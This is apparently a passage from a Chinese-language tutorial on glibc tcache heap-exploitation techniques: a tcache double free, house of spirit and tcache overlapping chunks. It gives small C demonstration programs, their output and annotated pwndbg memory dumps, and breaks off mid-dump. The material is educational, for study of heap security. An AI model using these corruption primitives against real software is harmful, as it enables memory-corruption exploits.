    0x555555756270: 0x0000000000000000  0x0000000000020d91
    0x555555756280: 0x0000000000000000  0x0000000000000000
    0x555555756290: 0x0000000000000000  0x0000000000000000
第一次free后
    pwndbg> x/10gx 0x555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000021
    0x555555756260: 0x0000000000000000  0x0000000000000000
    0x555555756270: 0x0000000000000000  0x0000000000020d91
    0x555555756280: 0x0000000000000000  0x0000000000000000
    0x555555756290: 0x0000000000000000  0x0000000000000000
    pwndbg> vmmap heap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x555555756000     0x555555777000 rw-p    21000 0      [heap]
    pwndbg> x/16gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000000001  0x0000000000000000      ==> counts = 1  //一开始是什么都没有的
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000555555756260  0x0000000000000000      ==> entries
    0x555555756060: 0x0000000000000000  0x0000000000000000
    0x555555756070: 0x0000000000000000  0x0000000000000000
第二次free后
    pwndbg> x/10gx 0x555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000021
    0x555555756260: 0x0000555555756260  0x0000000000000000      ==>double freed
    0x555555756270: 0x0000000000000000  0x0000000000020d91
    0x555555756280: 0x0000000000000000  0x0000000000000000
    0x555555756290: 0x0000000000000000  0x0000000000000000
    pwndbg> x/16gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000000002  0x0000000000000000      ==> counts = 2
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000555555756260  0x0000000000000000
    0x555555756060: 0x0000000000000000  0x0000000000000000
    0x555555756070: 0x0000000000000000  0x0000000000000000
再一次malloc后
    pwndbg> x/10gx 0x555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000021
    0x555555756260: 0x0000555555756260  0x0000000000000000
    0x555555756270: 0x0000000000000000  0x0000000000020d91
    0x555555756280: 0x0000000000000000  0x0000000000000000
    0x555555756290: 0x0000000000000000  0x0000000000000000
    pwndbg> x/16gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000000001  0x0000000000000000      ==> counts = 1
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000555555756260  0x0000000000000000
    0x555555756060: 0x0000000000000000  0x0000000000000000
    0x555555756070: 0x0000000000000000  0x0000000000000000
最后malloc后
    pwndbg> x/10gx 0x555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000021
    0x555555756260: 0x0000555555756260  0x0000000000000000
    0x555555756270: 0x0000000000000000  0x0000000000020d91
    0x555555756280: 0x0000000000000000  0x0000000000000000
    0x555555756290: 0x0000000000000000  0x0000000000000000
    pwndbg> x/16gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000000000  0x0000000000000000      ==> counts = 0
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000555555756260  0x0000000000000000
    0x555555756060: 0x0000000000000000  0x0000000000000000
    0x555555756070: 0x0000000000000000  0x0000000000000000
## house of spirit
    #include 
    #include 
    #include 
    int main() {
        malloc(1);  // init heap
        fprintf(stderr, "We will overwrite a pointer to point to a fake 'smallbin' region.\n");
        unsigned long long *a, *b;
        unsigned long long fake_chunk[64] __attribute__ ((aligned (16)));
        fprintf(stderr, "The chunk:  %p\n", &fake_chunk[0]);
        fake_chunk[1] = 0x110;  // the size
        memset(fake_chunk+2, 0x41, sizeof(fake_chunk)-0x10);
        fprintf(stderr, "Overwritting our pointer with the address of the fake region inside the fake chunk, %p.\n", &fake_chunk[0]);
        a = &fake_chunk[2];
        fprintf(stderr, "Freeing the overwritten pointer.\n");
        free(a);
        fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunk[0], &fake_chunk[2]);
        b = malloc(0x100);
        memset(fake_chunk+2, 0x42, sizeof(fake_chunk)-0x10);
        fprintf(stderr, "malloc(0x100): %p\n", b);
    }
运行之后：
    We will overwrite a pointer to point to a fake 'smallbin' region.
    The chunk:  0x7ffc4c03f800
    Overwritting our pointer with the address of the fake region inside the fake chunk, 0x7ffc4c03f800.
    Freeing the overwritten pointer.
    Now the next malloc will return the region of our fake chunk at 0x7ffc4c03f800, which will be 0x7ffc4c03f810!
    malloc(0x100): 0x7ffc4c03f810
gdb调试：  
第一次malloc后：
    pwndbg> x/10gx 0x555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000021
    0x555555756260: 0x0000000000000000  0x0000000000000000
    0x555555756270: 0x0000000000000000  0x0000000000020d91
    0x555555756280: 0x0000000000000000  0x0000000000000000
    0x555555756290: 0x0000000000000000  0x0000000000000000
    pwndbg> x/10gx fake_chunk
    0x7fffffffdca0: 0x0000000000000001  0x00007ffff7ffe728
    0x7fffffffdcb0: 0x00007ffff7ffe100  0x0000000000000001
    0x7fffffffdcc0: 0x00007ffff7fe04c0  0x00007ffff7ddff5f
    0x7fffffffdcd0: 0x00007ffff7ffe710  0x0000000000000000
    0x7fffffffdce0: 0x0000000000000000  0x00007ffff7ffa298
    pwndbg> x/10gx fake_chunk
    0x7fffffffdca0: 0x0000000000000001  0x0000000000000110      ==> 伪造的fake chunk size
    0x7fffffffdcb0: 0x00007ffff7ffe100  0x0000000000000001
    0x7fffffffdcc0: 0x00007ffff7fe04c0  0x00007ffff7ddff5f
    0x7fffffffdcd0: 0x00007ffff7ffe710  0x0000000000000000
    0x7fffffffdce0: 0x0000000000000000  0x00007ffff7ffa298
memset将`fake_chunk+2`后的内存填充为0x41
    pwndbg> x/10gx fake_chunk
    0x7fffffffdca0: 0x0000000000000001  0x0000000000000110
    0x7fffffffdcb0: 0x4141414141414141  0x4141414141414141
    0x7fffffffdcc0: 0x4141414141414141  0x4141414141414141
    0x7fffffffdcd0: 0x4141414141414141  0x4141414141414141
    0x7fffffffdce0: 0x4141414141414141  0x4141414141414141
free后
    pwndbg> x/10gx fake_chunk
    0x7fffffffdca0: 0x0000000000000001  0x0000000000000110      ==> be freed
    0x7fffffffdcb0: 0x0000000000000000  0x4141414141414141
    0x7fffffffdcc0: 0x4141414141414141  0x4141414141414141
    0x7fffffffdcd0: 0x4141414141414141  0x4141414141414141
    0x7fffffffdce0: 0x4141414141414141  0x4141414141414141
    pwndbg> vmmap heap
    LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
        0x555555756000     0x555555777000 rw-p    21000 0      [heap]
    pwndbg> x/30gx 0x555555756000
    0x555555756000: 0x0000000000000000  0x0000000000000251
    0x555555756010: 0x0000000000000000  0x0100000000000000      ==> counts
    0x555555756020: 0x0000000000000000  0x0000000000000000
    0x555555756030: 0x0000000000000000  0x0000000000000000
    0x555555756040: 0x0000000000000000  0x0000000000000000
    0x555555756050: 0x0000000000000000  0x0000000000000000
    0x555555756060: 0x0000000000000000  0x0000000000000000
    0x555555756070: 0x0000000000000000  0x0000000000000000
    0x555555756080: 0x0000000000000000  0x0000000000000000
    0x555555756090: 0x0000000000000000  0x0000000000000000
    0x5555557560a0: 0x0000000000000000  0x0000000000000000
    0x5555557560b0: 0x0000000000000000  0x0000000000000000
    0x5555557560c0: 0x0000000000000000  0x00007fffffffdcb0      ==> entries
    0x5555557560d0: 0x0000000000000000  0x0000000000000000
    0x5555557560e0: 0x0000000000000000  0x0000000000000000
再malloc(0x100)
    pwndbg> p a
    $1 = (unsigned long long *) 0x7fffffffdcb0
    pwndbg> p b
    $2 = (unsigned long long *) 0x7fffffffdcb0      //由于a的size被改，此位置被分配给b
    pwndbg> x/10gx fake_chunk
    0x7fffffffdca0: 0x0000000000000001  0x0000000000000110
    0x7fffffffdcb0: 0x4242424242424242  0x4242424242424242      ==> b
    0x7fffffffdcc0: 0x4242424242424242  0x4242424242424242
    0x7fffffffdcd0: 0x4242424242424242  0x4242424242424242
    0x7fffffffdce0: 0x4242424242424242  0x4242424242424242
## tcache_overlapping_chunks
    #include 
    #include 
    #include 
    #include 
    int main() {
        intptr_t *p1, *p2, *p3;
        p1 = malloc(0x50 - 8);
        p2 = malloc(0x20 - 8);
        memset(p1, 0x41, 0x50-8);
        memset(p2, 0x41, 0x30-8);
        fprintf(stderr, "Allocated victim chunk with requested size 0x48: %p\n", p1);
        fprintf(stderr, "Allocated sentry element after victim: %p\n", p2);
        int evil_chunk_size = 0x110;
        int evil_region_size = 0x110 - 8;
        fprintf(stderr, "Emulating corruption of the victim's size to 0x110\n");
        *(p1-1) = evil_chunk_size;
        fprintf(stderr, "Freed victim chunk to put it in a different tcache bin\n");
        free(p1);
        p3 = malloc(evil_region_size);
        memset(p3, 0x42, evil_region_size);
        fprintf(stderr, "Requested a chunk of 0x100 bytes\n");
        fprintf(stderr, "p3: %p ~ %p\n", p3, (char *)p3+evil_region_size);
        fprintf(stderr, "p2: %p ~ %p\n", p2, (char *)p2+0x20-8);
    }
运行结果：
    Allocated victim chunk with requested size 0x48: 0x555555756260
    Allocated sentry element after victim: 0x5555557562b0
    Emulating corruption of the victim's size to 0x110
    Freed victim chunk to put it in a different tcache bin
    Requested a chunk of 0x100 bytes
    p3: 0x555555756260 ~ 0x555555756368
    p2: 0x5555557562b0 ~ 0x5555557562c8
gdb调试：  
申请两个chunk
    pwndbg> x/16gx 0x555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000051      ==> p1
    0x555555756260: 0x4141414141414141  0x4141414141414141
    0x555555756270: 0x4141414141414141  0x4141414141414141
    0x555555756280: 0x4141414141414141  0x4141414141414141
    0x555555756290: 0x4141414141414141  0x4141414141414141
    0x5555557562a0: 0x4141414141414141  0x0000000000000021      ==> p2
    0x5555557562b0: 0x4141414141414141  0x4141414141414141
    0x5555557562c0: 0x4141414141414141  0x4141414141414141
第一个chunk的size被修改并free
    pwndbg> x/16gx 0x555555756250
    0x555555756250: 0x0000000000000000  0x0000000000000110      ==> 修改chunk的size
    0x555555756260: 0x0000000000000000  0x4141414141414141      ==> be freed
    0x555555756270: 0x4141414141414141  0x4141414141414141
    0x555555756280: 0x4141414141414141  0x4141414141414141